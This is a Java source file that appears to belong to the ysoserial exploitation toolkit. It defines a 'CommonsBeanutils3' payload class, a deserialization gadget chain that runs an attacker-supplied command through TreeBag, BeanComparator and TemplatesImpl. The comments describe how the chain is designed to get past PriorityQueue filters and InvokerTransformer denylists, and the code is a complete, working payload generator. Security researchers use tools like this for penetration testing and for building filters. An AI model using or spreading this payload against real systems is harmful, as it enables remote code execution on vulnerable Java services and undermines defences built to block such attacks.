package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.bag.TreeBag;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CommonsBeanutils via TreeBag entry point — bypasses PriorityQueue filters.

	Gadget chain:
		ObjectInputStream.readObject()
			TreeBag.readObject()
				AbstractMapBag.doReadObject()
					TreeMap.put()
						BeanComparator.compare()
							PropertyUtils.getProperty(obj, "outputProperties")
								TemplatesImpl.getOutputProperties()
									TemplatesImpl.newTransformer()
										defineTransletClasses() → RCE

	Combines CB's PropertyUtils reflection sink (BeanComparator) with
	CC8's TreeBag entry point. Distinct from:
		- CB1/CB2: use PriorityQueue entry (commonly filtered)
		- CC8: uses TransformingComparator + InvokerTransformer (CC denylist)
		- CB3: uses BeanComparator (CB only), TreeBag entry (not PriorityQueue)

	Bypasses TWO common filter strategies simultaneously:
		1. PriorityQueue entry filters → TreeBag entry instead
		2. InvokerTransformer denylists → PropertyUtils reflection instead

	Uses String.CASE_INSENSITIVE_ORDER as inner comparator to avoid
	CC3 dependency (BeanComparator default uses CC3's ComparableComparator).

	Requires:
		commons-beanutils 1.9.x (BeanComparator, PropertyUtils)
		commons-collections4 4.0+ (TreeBag)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.BOFEI_CHEN })
public class CommonsBeanutils3 extends PayloadRunner implements ObjectPayload<TreeBag> {

	public TreeBag getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		// Use String.CASE_INSENSITIVE_ORDER to avoid CC3 ComparableComparator dependency
		// null property during setup to avoid premature trigger
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

		// TreeBag entry: readObject → doReadObject → TreeMap.put → compare
		final TreeBag tree = new TreeBag(comparator);
		// Add dummy string — null property means BeanComparator delegates to inner comparator
		tree.add("1");

		// Arm the comparator — switch to the dangerous property
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// Replace the key in TreeBag's backing TreeMap
		// AbstractMapBag.map IS the TreeMap directly
		final java.util.TreeMap backingMap = (java.util.TreeMap)
			Reflections.getFieldValue(tree, "map");
		final Object root = Reflections.getFieldValue(backingMap, "root");
		if (root != null) {
			Reflections.setFieldValue(root, "key", templates);
		}

		return tree;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils3.class, args);
	}
}
